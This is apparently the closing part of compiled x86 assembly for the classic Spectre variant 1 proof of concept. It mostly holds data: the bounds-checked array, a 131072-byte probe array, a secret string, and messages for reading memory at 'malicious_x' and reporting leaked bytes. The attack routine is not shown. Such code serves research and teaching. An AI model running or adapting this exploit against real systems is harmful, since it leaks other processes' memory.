	call	printf@PLT
	add	esp, 16
	.cfi_adjust_cfa_offset -16
	jmp	.LBB3_9
.LBB3_45:
	xor	eax, eax
	add	esp, 76
	.cfi_def_cfa_offset 20
	pop	esi
	.cfi_def_cfa_offset 16
	pop	edi
	.cfi_def_cfa_offset 12
	pop	ebx
	.cfi_def_cfa_offset 8
	pop	ebp
	.cfi_def_cfa_offset 4
	ret
.Lfunc_end3:
	.size	main, .Lfunc_end3-main
	.cfi_endproc
                                        # -- End function
	.type	array1_size,@object             # @array1_size
	.data
	.globl	array1_size
	.p2align	2
array1_size:
	.long	16                              # 0x10
	.size	array1_size, 4

	.type	array1,@object                  # @array1
	.globl	array1
array1:
	.ascii	"\001\002\003\004\005\006\007\b\t\n\013\f\r\016\017\020"
	.zero	144
	.size	array1, 160

	.type	.L.str,@object                  # @.str
	.section	.rodata.str1.1,"aMS",@progbits,1
.L.str:
	.asciz	"The Magic Words are Squeamish Ossifrage."
	.size	.L.str, 41

	.type	secret,@object                  # @secret
	.data
	.globl	secret
	.p2align	2
secret:
	.long	.L.str
	.size	secret, 4

	.type	temp,@object                    # @temp
	.bss
	.globl	temp
temp:
	.byte	0                               # 0x0
	.size	temp, 1

	.type	array2,@object                  # @array2
	.globl	array2
array2:
	.zero	131072
	.size	array2, 131072

	.type	readMemoryByte.results,@object  # @readMemoryByte.results
	.local	readMemoryByte.results
	.comm	readMemoryByte.results,1024,4
	.type	.L.str.1,@object                # @.str.1
	.section	.rodata.str1.1,"aMS",@progbits,1
.L.str.1:
	.asciz	"Putting '%s' in memory, address %p\n"
	.size	.L.str.1, 36

	.type	.L.str.2,@object                # @.str.2
.L.str.2:
	.asciz	"%p"
	.size	.L.str.2, 3

	.type	.L.str.3,@object                # @.str.3
.L.str.3:
	.asciz	"%d"
	.size	.L.str.3, 3

	.type	.L.str.4,@object                # @.str.4
.L.str.4:
	.asciz	"Trying malicious_x = %p, len = %d\n"
	.size	.L.str.4, 35

	.type	.L.str.5,@object                # @.str.5
.L.str.5:
	.asciz	"Reading %d bytes:\n"
	.size	.L.str.5, 19

	.type	.L.str.6,@object                # @.str.6
.L.str.6:
	.asciz	"Reading at malicious_x = %p secc= %c ..."
	.size	.L.str.6, 41

	.type	.L.str.7,@object                # @.str.7
.L.str.7:
	.asciz	"%s: "
	.size	.L.str.7, 5

	.type	.L.str.8,@object                # @.str.8
.L.str.8:
	.asciz	"Success"
	.size	.L.str.8, 8

	.type	.L.str.9,@object                # @.str.9
.L.str.9:
	.asciz	"Unclear"
	.size	.L.str.9, 8

	.type	.L.str.10,@object               # @.str.10
.L.str.10:
	.asciz	"0x%02X='%c' score=%d "
	.size	.L.str.10, 22

	.type	.L.str.11,@object               # @.str.11
.L.str.11:
	.asciz	"(second best: 0x%02X='%c' score=%d)"
	.size	.L.str.11, 36

	.type	.L.str.13,@object               # @.str.13
.L.str.13:
	.asciz	"addr = %llx, pid = %d\n"
	.size	.L.str.13, 23

	.type	unused1,@object                 # @unused1
	.bss
	.globl	unused1
unused1:
	.zero	64
	.size	unused1, 64

	.type	unused2,@object                 # @unused2
	.globl	unused2
unused2:
	.zero	64
	.size	unused2, 64

	.ident	"Ubuntu clang version 14.0.0-1ubuntu1.1"
	.section	".note.GNU-stack","",@progbits
	.addrsig
	.addrsig_sym check
	.addrsig_sym array1_size
	.addrsig_sym array1
	.addrsig_sym array2
